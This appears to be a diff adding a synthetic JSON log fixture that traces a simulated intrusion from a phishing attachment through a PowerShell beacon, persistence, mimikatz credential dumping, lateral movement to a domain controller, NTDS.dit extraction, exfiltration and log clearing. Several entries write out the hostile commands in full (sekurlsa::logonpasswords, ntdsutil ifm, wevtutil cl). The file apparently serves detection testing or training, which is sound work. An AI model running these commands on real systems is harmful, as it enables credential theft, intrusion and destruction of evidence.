@@ -1,0 +1,218 @@
+[
+  {
+    "timestamp": "2026-04-22T09:15:02Z",
+    "source_host": "MAIL-GW-01",
+    "source_ip": "10.0.1.5",
+    "dest_host": "WS-FINANCE-01",
+    "dest_ip": "10.0.2.101",
+    "event_type": "network",
+    "raw": "Email received from external sender: urgent_invoice_Q1.docx attachment, sender: accounting@legit-partner.com"
+  },
+  {
+    "timestamp": "2026-04-22T09:17:00Z",
+    "source_host": "WS-FINANCE-01",
+    "source_ip": "10.0.2.101",
+    "dest_host": null,
+    "dest_ip": null,
+    "event_type": "file",
+    "raw": "File created: C:\\Users\\jsmith\\Downloads\\urgent_invoice_Q1.docx by OUTLOOK.EXE pid=3284"
+  },
+  {
+    "timestamp": "2026-04-22T09:18:23Z",
+    "source_host": "WS-FINANCE-01",
+    "source_ip": "10.0.2.101",
+    "dest_host": null,
+    "dest_ip": null,
+    "event_type": "process",
+    "raw": "WINWORD.EXE spawned process: cmd.exe /c powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA pid=4102 ppid=3920"
+  },
+  {
+    "timestamp": "2026-04-22T09:19:29Z",
+    "source_host": "WS-FINANCE-01",
+    "source_ip": "10.0.2.101",
+    "dest_host": null,
+    "dest_ip": null,
+    "event_type": "process",
+    "raw": "powershell.exe -ExecutionPolicy Bypass -enc SQBFAFgA executing Invoke-Expression with downloaded payload pid=4200"
+  },
+  {
+    "timestamp": "2026-04-22T09:20:00Z",
+    "source_host": "WS-FINANCE-01",
+    "source_ip": "10.0.2.101",
+    "dest_host": null,
+    "dest_ip": "185.29.10.44",
+    "event_type": "network",
+    "raw": "TCP connection established to 185.29.10.44:443 (HTTPS) by powershell.exe pid=4200 - beacon callback detected"
+  },
+  {
+    "timestamp": "2026-04-22T09:20:22Z",
+    "source_host": "WS-FINANCE-01",
+    "source_ip": "10.0.2.101",
+    "dest_host": null,
+    "dest_ip": null,
+    "event_type": "file",
+    "raw": "File dropped: C:\\ProgramData\\svchost_update.exe by powershell.exe - Ingress Tool Transfer"
+  },
+  {
+    "timestamp": "2026-04-22T09:23:06Z",
+    "source_host": "WS-FINANCE-01",
+    "source_ip": "10.0.2.101",
+    "dest_host": null,
+    "dest_ip": null,
+    "event_type": "registry",
+    "raw": "Registry key modified: HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdate = C:\\ProgramData\\svchost_update.exe"
+  },
+  {
+    "timestamp": "2026-04-22T09:24:06Z",
+    "source_host": "WS-FINANCE-01",
+    "source_ip": "10.0.2.101",
+    "dest_host": null,
+    "dest_ip": null,
+    "event_type": "process",
+    "raw": "schtasks /create /tn \"SystemHealthCheck\" /tr C:\\ProgramData\\svchost_update.exe /sc onlogon /ru SYSTEM"
+  },
+  {
+    "timestamp": "2026-04-22T09:45:13Z",
+    "source_host": "WS-FINANCE-01",
+    "source_ip": "10.0.2.101",
+    "dest_host": null,
+    "dest_ip": null,
+    "event_type": "process",
+    "raw": "Process started: C:\\ProgramData\\m.exe (mimikatz) sekurlsa::logonpasswords pid=5100 - LSASS memory access detected"
+  },
+  {
+    "timestamp": "2026-04-22T09:46:25Z",
+    "source_host": "WS-FINANCE-01",
+    "source_ip": "10.0.2.101",
+    "dest_host": null,
+    "dest_ip": null,
+    "event_type": "process",
+    "raw": "lsass.exe access by pid=5100 with PROCESS_VM_READ - credential dumping via mimikatz sekurlsa module"
+  },
+  {
+    "timestamp": "2026-04-22T09:47:26Z",
+    "source_host": "WS-FINANCE-01",
+    "source_ip": "10.0.2.101",
+    "dest_host": null,
+    "dest_ip": null,
+    "event_type": "auth",
+    "raw": "Credentials extracted: jsmith (CORP\\jsmith), admin_svc (CORP\\admin_svc), Domain: CORP.LOCAL"
+  },
+  {
+    "timestamp": "2026-04-22T09:50:23Z",
+    "source_host": "WS-FINANCE-01",
+    "source_ip": "10.0.2.101",
+    "dest_host": null,
+    "dest_ip": null,
+    "event_type": "process",
+    "raw": "net user /domain executed - Account Discovery enumerating domain users"
+  },
+  {
+    "timestamp": "2026-04-22T09:51:24Z",
+    "source_host": "WS-FINANCE-01",
+    "source_ip": "10.0.2.101",
+    "dest_host": null,
+    "dest_ip": null,
+    "event_type": "process",
+    "raw": "net group \"Domain Admins\" /domain - Permission Groups Discovery targeting admin accounts"
+  },
+  {
+    "timestamp": "2026-04-22T09:52:20Z",
+    "source_host": "WS-FINANCE-01",
+    "source_ip": "10.0.2.101",
+    "dest_host": null,
+    "dest_ip": null,
+    "event_type": "process",
+    "raw": "nltest /dclist:CORP.LOCAL - Remote System Discovery enumerating domain controllers"
+  },
+  {
+    "timestamp": "2026-04-22T09:53:16Z",
+    "source_host": "WS-FINANCE-01",
+    "source_ip": "10.0.2.101",
+    "dest_host": null,
+    "dest_ip": null,
+    "event_type": "process",
+    "raw": "systeminfo executed - System Information Discovery on local workstation"
+  },
+  {
+    "timestamp": "2026-04-22T10:15:23Z",
+    "source_host": "WS-FINANCE-01",
+    "source_ip": "10.0.2.101",
+    "dest_host": "SRV-FILE-01",
+    "dest_ip": "10.0.3.10",
+    "event_type": "lateral",
+    "raw": "SMB session established from WS-FINANCE-01 to \\\\SRV-FILE-01\\ADMIN$ using CORP\\admin_svc credentials via PsExec"
+  },
+  {
+    "timestamp": "2026-04-22T10:17:05Z",
+    "source_host": "SRV-FILE-01",
+    "source_ip": "10.0.3.10",
+    "dest_host": null,
+    "dest_ip": null,
+    "event_type": "process",
+    "raw": "PSEXESVC.exe started on SRV-FILE-01 - PsExec service installed by remote admin_svc"
+  },
+  {
+    "timestamp": "2026-04-22T10:20:04Z",
+    "source_host": "SRV-FILE-01",
+    "source_ip": "10.0.3.10",
+    "dest_host": "DC-01",
+    "dest_ip": "10.0.1.10",
+    "event_type": "lateral",
+    "raw": "wmic /node:DC-01 process call create \"cmd.exe /c whoami\" - WMI lateral movement to domain controller"
+  },
+  {
+    "timestamp": "2026-04-22T10:21:21Z",
+    "source_host": "DC-01",
+    "source_ip": "10.0.1.10",
+    "dest_host": null,
+    "dest_ip": null,
+    "event_type": "auth",
+    "raw": "Successful logon: CORP\\admin_svc from 10.0.3.10 - Logon Type 3 (Network) on Domain Controller DC-01"
+  },
+  {
+    "timestamp": "2026-04-22T10:45:23Z",
+    "source_host": "DC-01",
+    "source_ip": "10.0.1.10",
+    "dest_host": null,
+    "dest_ip": null,
+    "event_type": "process",
+    "raw": "ntdsutil \"activate instance ntds\" \"ifm\" \"create full C:\\temp\\ntds_dump\" - NTDS.dit extraction for offline credential harvesting"
+  },
+  {
+    "timestamp": "2026-04-22T10:47:18Z",
+    "source_host": "DC-01",
+    "source_ip": "10.0.1.10",
+    "dest_host": null,
+    "dest_ip": null,
+    "event_type": "process",
+    "raw": "7z a -p C:\\temp\\data_archive.7z C:\\temp\\ntds_dump\\* - Archive Collected Data with password protection"
+  },
+  {
+    "timestamp": "2026-04-22T10:50:11Z",
+    "source_host": "DC-01",
+    "source_ip": "10.0.1.10",
+    "dest_host": null,
+    "dest_ip": "185.29.10.44",
+    "event_type": "network",
+    "raw": "Large data upload detected: DC-01 -> 185.29.10.44:443 (32MB transfer) - Exfiltration Over C2 Channel via HTTPS beacon"
+  },
+  {
+    "timestamp": "2026-04-22T10:55:16Z",
+    "source_host": "DC-01",
+    "source_ip": "10.0.1.10",
+    "dest_host": null,
+    "dest_ip": null,
+    "event_type": "process",
+    "raw": "wevtutil cl Security - Clear Windows Event Logs on DC-01 to cover tracks"
+  },
+  {
+    "timestamp": "2026-04-22T10:56:07Z",
+    "source_host": "WS-FINANCE-01",
+    "source_ip": "10.0.2.101",
+    "dest_host": null,
+    "dest_ip": null,
+    "event_type": "process",
+    "raw": "wevtutil cl Security - Clear Windows Event Logs on initial foothold workstation"
+  }
+]
